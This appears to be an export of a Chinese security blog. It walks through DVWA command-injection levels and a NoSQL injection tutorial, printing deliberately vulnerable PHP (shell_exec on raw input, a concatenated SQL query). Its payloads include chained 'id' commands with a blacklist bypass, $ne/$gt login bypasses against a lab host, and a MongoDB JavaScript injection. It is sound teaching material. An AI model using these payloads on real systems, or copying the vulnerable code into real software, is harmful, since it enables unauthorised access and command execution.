&lt;em&gt;&#123;$failed_login&#125;&lt;/em&gt;.&lt;br /&gt;Last login attempt was at: &lt;em&gt;$&#123;last_login&#125;&lt;/em&gt;.&lt;/p&gt;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Reset bad login count</span></span><br><span class="line">        $data = $db-&gt;prepare( <span class="string">'UPDATE users SET failed_login = "0" WHERE user = (:user) LIMIT 1;'</span> );</span><br><span class="line">        $data-&gt;bindParam( <span class="string">':user'</span>, $user, PDO::PARAM_STR );</span><br><span class="line">        $data-&gt;execute();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Login failed</span></span><br><span class="line">        sleep( rand( <span class="number">2</span>, <span class="number">4</span> ) );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Give the user some feedback</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;br /&gt;&lt;br/&gt;Alternative, the account has been locked because of too many failed logins.&lt;br /&gt;If this is the case, &lt;em&gt;please try again in &#123;$lockout_time&#125; minutes&lt;/em&gt;.&lt;/pre&gt;"</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Update bad login count</span></span><br><span class="line">        $data = $db-&gt;prepare( <span class="string">'UPDATE users SET failed_login = (failed_login + 1) WHERE user = (:user) LIMIT 1;'</span> );</span><br><span class="line">        $data-&gt;bindParam( <span class="string">':user'</span>, $user, PDO::PARAM_STR );</span><br><span class="line">        $data-&gt;execute();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Set the last login time</span></span><br><span class="line">    $data = $db-&gt;prepare( <span class="string">'UPDATE users SET last_login = now() WHERE user = (:user) LIMIT 1;'</span> );</span><br><span class="line">    $data-&gt;bindParam( <span class="string">':user'</span>, $user, PDO::PARAM_STR );</span><br><span class="line">    $data-&gt;execute();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li><p>设置最大失败次数</p>
</li>
<li><p>设置失败次数过多导致账号锁定后限制请求频率</p>
</li>
</ul>
]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>DVWA</tag>
        <tag>暴力破解</tag>
      </tags>
  </entry>
  <entry>
    <title>DVWA(1.9)-Command Injection</title>
    <url>/2020/07/08/blog_formal/security/dvwa/CommandInjection/</url>
    <content><![CDATA[<h1 id="Command-Injection"><a href="#Command-Injection" class="headerlink" title="Command Injection"></a>Command Injection</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>​        任意命令执行，由于网站后台没有对参数进行严格效验，并且调用 exec 等系统执行函数，造成攻击者可以执行任意后台命令。</p>
<p><img data-src="./CommandInjection/1.png" alt></p>
<a id="more"></a>

<h2 id="Low级别"><a href="#Low级别" class="headerlink" title="Low级别"></a>Low级别</h2><h3 id="源码审计"><a href="#源码审计" class="headerlink" title="源码审计"></a>源码审计</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">'Submit'</span> ]  ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $target = $_REQUEST[ <span class="string">'ip'</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Determine OS and execute the ping command.</span></span><br><span class="line">    <span class="keyword">if</span>( stristr( php_uname( <span class="string">'s'</span> ), <span class="string">'Windows NT'</span> ) ) &#123;</span><br><span class="line">        <span class="comment">// Windows</span></span><br><span class="line">        $cmd = shell_exec( <span class="string">'ping  '</span> . $target );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// *nix</span></span><br><span class="line">        $cmd = shell_exec( <span class="string">'ping  -c 4 '</span> . $target );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Feedback for the end user</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>代码中没有对输入进行任何效验</li>
</ul>
<h3 id="解答"><a href="#解答" class="headerlink" title="解答"></a>解答</h3><p>​        这个比较简单，只需要对命令进行拼接就可以了(&amp;&amp; ; | 等)</p>
<p>比如如下命令</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">192.168.0.1;id</span><br></pre></td></tr></table></figure>

<p><img data-src="./CommandInjection/2.png" alt></p>
<h2 id="Medium级别"><a href="#Medium级别" class="headerlink" title="Medium级别"></a>Medium级别</h2><h3 id="源码审计-1"><a href="#源码审计-1" class="headerlink" title="源码审计"></a>源码审计</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">'Submit'</span> ]  ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $target = $_REQUEST[ <span class="string">'ip'</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Set blacklist</span></span><br><span class="line">    $substitutions = <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">'&amp;&amp;'</span> =&gt; <span class="string">''</span>,</span><br><span class="line">        <span class="string">';'</span>  =&gt; <span class="string">''</span>,</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Remove any of the charactars in the array (blacklist).</span></span><br><span class="line">    $target = str_replace( array_keys( $substitutions ), $substitutions, $target );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Determine OS and execute the ping command.</span></span><br><span class="line">    <span class="keyword">if</span>( stristr( php_uname( <span class="string">'s'</span> ), <span class="string">'Windows NT'</span> ) ) &#123;</span><br><span class="line">        <span class="comment">// Windows</span></span><br><span class="line">        $cmd = shell_exec( <span class="string">'ping  '</span> . $target );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// *nix</span></span><br><span class="line">        $cmd = shell_exec( <span class="string">'ping  -c 4 '</span> . $target );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Feedback for the end user</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>只对 &amp;&amp; ；两个字符过滤, &amp; | 等危险字符黑名单不过滤，仍然可被绕过</li>
</ul>
<h3 id="解答-1"><a href="#解答-1" class="headerlink" title="解答"></a>解答</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">192.168.1.1&amp;id</span><br></pre></td></tr></table></figure>

<p><img data-src="./CommandInjection/3.png" alt></p>
<h2 id="High级别"><a href="#High级别" class="headerlink" title="High级别"></a>High级别</h2><h3 id="源码审计-2"><a href="#源码审计-2" class="headerlink" title="源码审计"></a>源码审计</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">'Submit'</span> ]  ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $target = trim($_REQUEST[ <span class="string">'ip'</span> ]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Set blacklist</span></span><br><span class="line">    $substitutions = <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">'&amp;'</span>  =&gt; <span class="string">''</span>,</span><br><span class="line">        <span class="string">';'</span>  =&gt; <span class="string">''</span>,</span><br><span class="line">        <span class="string">'| '</span> =&gt; <span class="string">''</span>,</span><br><span class="line">        <span class="string">'-'</span>  =&gt; <span class="string">''</span>,</span><br><span class="line">        <span class="string">'$'</span>  =&gt; <span class="string">''</span>,</span><br><span class="line">        <span class="string">'('</span>  =&gt; <span class="string">''</span>,</span><br><span class="line">        <span class="string">')'</span>  =&gt; <span class="string">''</span>,</span><br><span class="line">        <span class="string">'`'</span>  =&gt; <span class="string">''</span>,</span><br><span class="line">        <span class="string">'||'</span> =&gt; <span class="string">''</span>,</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Remove any of the charactars in the array (blacklist).</span></span><br><span class="line">    $target = str_replace( array_keys( $substitutions ), $substitutions, $target );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Determine OS and execute the ping command.</span></span><br><span class="line">    <span class="keyword">if</span>( stristr( php_uname( <span class="string">'s'</span> ), <span class="string">'Windows NT'</span> ) ) &#123;</span><br><span class="line">        <span class="comment">// Windows</span></span><br><span class="line">        $cmd = shell_exec( <span class="string">'ping  '</span> . $target );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// *nix</span></span><br><span class="line">        $cmd = shell_exec( <span class="string">'ping  -c 4 '</span> . $target );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Feedback for the end user</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_GET[ <span class="string">'Login'</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">    checkToken( $_REQUEST[ <span class="string">'user_token'</span> ], $_SESSION[ <span class="string">'session_token'</span> ], <span class="string">'index.php'</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitise username input</span></span><br><span class="line">    $user = $_GET[ <span class="string">'username'</span> ];</span><br><span class="line">    $user = stripslashes( $user );</span><br><span class="line">    $user = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">"___mysqli_ston"</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $user ) : ((trigger_error(<span class="string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="string">""</span> : <span class="string">""</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitise password input</span></span><br><span class="line">    $pass = $_GET[ <span class="string">'password'</span> ];</span><br><span class="line">    $pass = stripslashes( $pass );</span><br><span class="line">    $pass = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">"___mysqli_ston"</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $pass ) : ((trigger_error(<span class="string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="string">""</span> : <span class="string">""</span>));</span><br><span class="line">    $pass = md5( $pass );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check database</span></span><br><span class="line">    $query  = <span class="string">"SELECT * FROM `users` WHERE user = '$user' AND password = '$pass';"</span>;</span><br><span class="line">    $result = mysqli_query($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $query ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">'&lt;pre&gt;'</span> . ((is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_error($GLOBALS[<span class="string">"___mysqli_ston"</span>]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : <span class="keyword">false</span>)) . <span class="string">'&lt;/pre&gt;'</span> );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( $result &amp;&amp; mysqli_num_rows( $result ) == <span class="number">1</span> ) &#123;</span><br><span class="line">        <span class="comment">// Get users details</span></span><br><span class="line">        $row    = mysqli_fetch_assoc( $result );</span><br><span class="line">        $avatar = $row[<span class="string">"avatar"</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Login successful</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;p&gt;Welcome to the password protected area &#123;$user&#125;&lt;/p&gt;"</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;img src=\"&#123;$avatar&#125;\" /&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Login failed</span></span><br><span class="line">        sleep( rand( <span class="number">0</span>, <span class="number">3</span> ) );</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((is_null($___mysqli_res = mysqli_close($GLOBALS[<span class="string">"___mysqli_ston"</span>]))) ? <span class="keyword">false</span> : $___mysqli_res);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>相对比较严格的黑名单</li>
<li>看了好久，发现 | 的过滤多了一个空格(wc)</li>
<li>开发者通过黑名单的方式防止任意命令很难没有失误</li>
</ul>
<h3 id="解答-2"><a href="#解答-2" class="headerlink" title="解答"></a>解答</h3><p>通过这个 | 带空格绕过</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">192.168.1.1|id</span><br></pre></td></tr></table></figure>

<p><img data-src="./CommandInjection/4.png" alt></p>
<h2 id="Impossible级别"><a href="#Impossible级别" class="headerlink" title="Impossible级别"></a>Impossible级别</h2><h3 id="欣赏源码"><a href="#欣赏源码" class="headerlink" title="欣赏源码"></a>欣赏源码</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">'Submit'</span> ]  ) ) &#123;</span><br><span class="line">    <span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">    checkToken( $_REQUEST[ <span class="string">'user_token'</span> ], $_SESSION[ <span class="string">'session_token'</span> ], <span class="string">'index.php'</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $target = $_REQUEST[ <span class="string">'ip'</span> ];</span><br><span class="line">    $target = stripslashes( $target );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Split the IP into 4 octects</span></span><br><span class="line">    $octet = explode( <span class="string">"."</span>, $target );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check IF each octet is an integer</span></span><br><span class="line">    <span class="keyword">if</span>( ( is_numeric( $octet[<span class="number">0</span>] ) ) &amp;&amp; ( is_numeric( $octet[<span class="number">1</span>] ) ) &amp;&amp; ( is_numeric( $octet[<span class="number">2</span>] ) ) &amp;&amp; ( is_numeric( $octet[<span class="number">3</span>] ) ) &amp;&amp; ( sizeof( $octet ) == <span class="number">4</span> ) ) &#123;</span><br><span class="line">        <span class="comment">// If all 4 octets are int's put the IP back together.</span></span><br><span class="line">        $target = $octet[<span class="number">0</span>] . <span class="string">'.'</span> . $octet[<span class="number">1</span>] . <span class="string">'.'</span> . $octet[<span class="number">2</span>] . <span class="string">'.'</span> . $octet[<span class="number">3</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Determine OS and execute the ping command.</span></span><br><span class="line">        <span class="keyword">if</span>( stristr( php_uname( <span class="string">'s'</span> ), <span class="string">'Windows NT'</span> ) ) &#123;</span><br><span class="line">            <span class="comment">// Windows</span></span><br><span class="line">            $cmd = shell_exec( <span class="string">'ping  '</span> . $target );</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// *nix</span></span><br><span class="line">            $cmd = shell_exec( <span class="string">'ping  -c 4 '</span> . $target );</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for the end user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Ops. Let the user name theres a mistake</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;pre&gt;ERROR: You have entered an invalid IP.&lt;/pre&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>白名单检测，检测ip</li>
<li>检测ip是不是4个段 + 每个段是不是数字</li>
<li>白名单检测才是防止攻击者入侵的正确解法</li>
</ul>
]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>DVWA</tag>
        <tag>任意命令执行</tag>
      </tags>
  </entry>
  <entry>
    <title>NoSQL注入</title>
    <url>/2021/06/11/blog_formal/security/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/NoSQL%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<h1 id="NoSQL注入"><a href="#NoSQL注入" class="headerlink" title="NoSQL注入"></a>NoSQL注入</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>​    <code>NoSQL</code>数据存储由于其可扩展性和易用性，最近几年变得越来越受欢迎，但是伴随着<code>NoSQL</code>数据库的兴起，安全问题也伴随着呈现。新的查询语法将传统的<code>SQL</code>注入方法语句将不再适用，本文将讨论几种<code>NoSQL</code>注入方式以及其数据库的安全风险。</p>
<a id="more"></a>

<p>​    主要从如下四个方面进行说明</p>
<ul>
<li><code>php array injection attack</code>(php数据注入攻击)</li>
<li><code>MongoDB OR injection</code> (mongo or 注入)</li>
<li><code>arbitrary JavaScript injection</code>(任意js文件执行)</li>
<li><code>more</code></li>
</ul>
<h2 id="注入姿势"><a href="#注入姿势" class="headerlink" title="注入姿势"></a>注入姿势</h2><h3 id="PHP-ARRAY-INJECTIONS"><a href="#PHP-ARRAY-INJECTIONS" class="headerlink" title="PHP ARRAY INJECTIONS"></a><code>PHP ARRAY INJECTIONS</code></h3><ul>
<li>服务器后台架构如下：后台为<code>php</code>后台，<code>php</code>后台通过<code>json</code>格式的数据与<code>NoSQL</code>数据库进行数据交互</li>
</ul>
<p><img data-src="./NoSQL%E6%B3%A8%E5%85%A5/1.png" alt></p>
<ul>
<li><code>php</code>本身是不支持字典格式的，内部通过数组编码为<code>json</code>格式，<code>eg</code>:</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">array</span>(<span class="string">'username'</span> =&gt; <span class="string">'weiyi'</span>, <span class="string">'password'</span> =&gt; <span class="string">'123456'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment"># 编码后</span></span><br><span class="line"><span class="comment">// &#123;"username":"weiyi", "password":"123456"&#125;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>可以考虑这么一个场景，开发过程中登录<code>HTTP</code>请求大体会长这个样子</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">username=weiyi&amp;password=123456</span><br></pre></td></tr></table></figure>

<ul>
<li>那么我们<code>php</code>后台代码大概的样子为</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">db-&gt;users-&gt;find(<span class="keyword">array</span>(<span class="string">'username'</span> =&gt; $_POST[<span class="string">'username'</span>], <span class="string">'password'</span> =&gt; $_POST[<span class="string">'password'</span>]));</span><br><span class="line"></span><br><span class="line"><span class="comment"># 转换成数据库查询语句</span></span><br><span class="line">db.users.find(&#123;<span class="string">"username"</span>:<span class="string">"weiyi"</span>, <span class="string">"password"</span>:<span class="string">"123456"</span>&#125;);</span><br></pre></td></tr></table></figure>

<ul>
<li><code>php</code>特定的语法特点是可以允许攻击者传入如下恶意请求</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">username[$</span><span class="bash">ne]=1&amp;password[<span class="variable">$ne</span>]=1</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 转换成 php 数组</span></span><br><span class="line">array('username' =&gt; array('$ne' =&gt; '1'), 'password' =&gt; array('$ne' =&gt; '1'));</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 转换成 mongo 查询语句</span></span><br><span class="line">db.users.find(&#123;"username":&#123;"$ne":1&#125;, "password":&#123;"$ne":1&#125;&#125;);</span><br></pre></td></tr></table></figure>

<ul>
<li>这样我们就可以绕过登录限制，达到未授权访问后端</li>
</ul>
<p>语义为 <code>username</code>不等于1，并且<code>password</code>不等于1的用户，转换成我们熟悉的<code>SQL</code>语句如下</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">select * from users where username &lt;&gt; 1 and password &lt;&gt; 1</span><br></pre></td></tr></table></figure>

<ul>
<li>靶场<code>demo</code></li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 核心代码</span></span><br><span class="line">$dbUsername = <span class="keyword">null</span>;</span><br><span class="line">$dbPassword = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">$data = <span class="keyword">array</span>(</span><br><span class="line">   	<span class="string">'username'</span> =&gt;  $_REQUEST[<span class="string">'username'</span>],</span><br><span class="line">   	<span class="string">'password'</span> =&gt;  $_REQUEST[<span class="string">'password'</span>]</span><br><span class="line">   		</span><br><span class="line">); </span><br><span class="line">$cursor = $collection-&gt;find($data);</span><br><span class="line">$count = $cursor-&gt;count();</span><br><span class="line">$doc_failed = <span class="keyword">new</span> DOMDocument();</span><br><span class="line">$doc_failed-&gt;loadHTMLFile(<span class="string">"failed.html"</span>);</span><br><span class="line">$doc_succeed = <span class="keyword">new</span> DOMDocument();</span><br><span class="line">$doc_succeed-&gt;loadHTMLFile(<span class="string">"succeed.html"</span>);</span><br></pre></td></tr></table></figure>

<ul>
<li>登录界面</li>
</ul>
<p><img data-src="./NoSQL%E6%B3%A8%E5%85%A5/2.png" alt></p>
<ul>
<li>正常登录界面 </li>
</ul>
<p><code>http://10.33.98.80/nosql/login/login.php?username=weiyi&amp;password=5555555&amp;login-submit=login</code></p>
<p><img data-src="./NoSQL%E6%B3%A8%E5%85%A5/3.png" alt></p>
<p><img data-src="./NoSQL%E6%B3%A8%E5%85%A5/4.png" alt></p>
<ul>
<li>绕过姿势</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">http://10.33.98.80/nosql/login/login.php?username[$ne]=1&amp;password[$ne]=1&amp;login-submit=login</span><br></pre></td></tr></table></figure>

<p><img data-src="./NoSQL%E6%B3%A8%E5%85%A5/5.png" alt></p>
<ul>
<li><p>配合条件操作符</p>
<ul>
<li>(&gt;) 大于 - <code>$gt</code></li>
<li>(&lt;) 小于 - <code>$lt</code></li>
<li>(&gt;=) 大于等于 - <code>$gte</code></li>
<li>(&lt;= ) 小于等于 - <code>$lte</code></li>
</ul>
<p>类似于<code>SQL bool</code>注入，我们尝试爆破<code>username</code>字段最后一个字符</p>
</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">http://10.33.98.80/nosql/login/login.php?username[$gt]=weiyh&amp;password[$ne]=1&amp;login-submit=login</span><br></pre></td></tr></table></figure>

<p><img data-src="./NoSQL%E6%B3%A8%E5%85%A5/6.png" alt></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">http://10.33.98.80/nosql/login/login.php?username[$gt]=weiyi&amp;password[$ne]=1&amp;login-submit=login</span><br></pre></td></tr></table></figure>

<p><img data-src="./NoSQL%E6%B3%A8%E5%85%A5/7.png" alt></p>
<ul>
<li>其实不光是<code>php</code>有类似的问题，如果是其他语言的后台，比如<code>python</code>,同样可以传递字典，进行<code>nosql</code>注入</li>
</ul>
<p><img data-src="./NoSQL%E6%B3%A8%E5%85%A5/8.png" alt></p>
<h3 id="NoSQL-OR-INJECTION"><a href="#NoSQL-OR-INJECTION" class="headerlink" title="NoSQL OR INJECTION"></a><code>NoSQL OR INJECTION</code></h3><p>​    大家都知道，<code>SQL</code>注入的根本原因是<code>SQL</code>语句拼接前端不可信参数，未进行合理的编码导致。<code>JSON</code>格式的查询的数据交互方式让参数拼接变得难度倍增，但是并不代表没有可能</p>
<ul>
<li>比如场景下开发的代码可能是这个样子</li>
</ul>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="built_in">string</span> query = <span class="string">"&#123;username: '"</span> + post_username + <span class="string">"', password: '"</span> + post_password + <span class="string">"'&#125;"</span>;</span><br><span class="line"></span><br><span class="line">db.users.execute(query);</span><br></pre></td></tr></table></figure>

<ul>
<li>正常用户的输入会是如下的</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">username=weiyi&amp;password=123456</span><br><span class="line"><span class="meta">#</span><span class="bash"> json</span></span><br><span class="line">&#123;"username": "weiyi", "password": "123456"&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>如果未对参数进行任何效验，那么攻击者可能构造如下语句，造成绕过登录限制</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">username=weiyi', $or:[&#123;&#125;, &#123;'a':'a&amp;password='&#125;]</span><br></pre></td></tr></table></figure>

<ul>
<li>拼接后的语句为</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">string query = "&#123;username: 'weiyi', $or:[&#123;&#125;, &#123;'a':'a', password: ''&#125;] &#125;";</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> mongo 查询语句</span></span><br><span class="line">&#123;username: 'weiyi', $or:[&#123;&#125;, &#123;'a':'a', password: ''&#125;] &#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><code>{}</code>空查询<code>nosql</code>语法判断为<code>true</code></li>
<li>这里转换成传统的<code>SQL</code>语句</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">SELECT * FROM users WHERE username = 'weiyi' AND (TRUE OR ('a'='a' AND PASSWORD = ''))</span><br></pre></td></tr></table></figure>

<ul>
<li>最终，我们可以实现只要获取到用户名，就可以绕过密码进行登录</li>
</ul>
<h3 id="NoSQL-JAVASCRIPT-INJECTION"><a href="#NoSQL-JAVASCRIPT-INJECTION" class="headerlink" title="NoSQL JAVASCRIPT INJECTION"></a><code>NoSQL JAVASCRIPT INJECTION</code></h3><p>​    这部分主要说的是<code>nosql</code>数据库的一个任意<code>javaScript</code>执行，众多非关系型数据库引擎是支持<code>js</code>代码的执行的，比如<code>MongoDB</code>,<code>CouchDB</code>等等，为的是实现更为复杂的查询操作，比如<code>map-reduce</code>操作</p>
<p>​    比如如下场景：后端<code>model</code>层暴露了一个未经过滤的接口，参数<code>$param</code>可控。这里举一个最简单的<code>map-reduce</code>,统计一些商品的总价，<code>$param</code>为商品价格，后端的<code>PHP</code>代码可能是这个样子</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// map</span></span><br><span class="line">$map = <span class="string">"function() &#123;</span></span><br><span class="line"><span class="string">	for (var i = 0; i &lt; this.items.length; i++) &#123;</span></span><br><span class="line"><span class="string"> 		emit(this.name, this.items[i].$param); &#125; &#125;"</span>;</span><br><span class="line"><span class="comment">// reduce</span></span><br><span class="line">$reduce = <span class="string">"function(name, sum) &#123; return Array.sum(sum); &#125;"</span>;</span><br><span class="line"></span><br><span class="line">$opt = <span class="string">"&#123; out: 'totals' &#125;"</span>;</span><br><span class="line">$db-&gt;execute(<span class="string">"db.stores.mapReduce($map, $reduce, $opt);"</span>);</span><br></pre></td></tr></table></figure>

<ul>
<li>可能的注入代码如下</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">a);&#125;&#125;,<span class="function"><span class="keyword">function</span><span class="params">(kv)</span> </span>&#123; <span class="keyword">return</span> <span class="number">1</span>; &#125;, &#123; out: <span class="string">'x'</span> &#125;);</span><br><span class="line">db.injection.insert(&#123;success:<span class="number">1</span>&#125;);</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;db.stores.mapReduce(<span class="function"><span class="keyword">function</span><span class="params">()</span> </span>&#123; &#123; emit(<span class="number">1</span>,<span class="number">1</span></span><br></pre></td></tr></table></figure>

<ul>
<li>这里我们将代码分为三部分进行分析</li>
</ul>
